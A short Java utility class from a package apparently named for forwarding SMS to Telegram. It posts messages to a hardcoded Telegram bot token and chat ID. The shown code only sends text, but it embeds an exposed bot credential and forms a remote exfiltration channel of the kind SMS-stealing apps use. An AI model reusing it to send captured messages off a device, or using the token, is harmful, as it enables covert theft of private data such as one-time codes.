package com.example.sms2telegram;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramUtils {
    private static final String BOT_TOKEN = "7841305499:AAElwSSCBPF6-2cf_NEL3TXiK760exGM9pg";
    private static final String CHAT_ID = "7570861617";

    public static void sendMessage(String message) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String payload = "chat_id=" + CHAT_ID + "&text=" + message;
                OutputStream os = conn.getOutputStream();
                os.write(payload.getBytes());
                os.flush();
                os.close();
                conn.getResponseCode();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
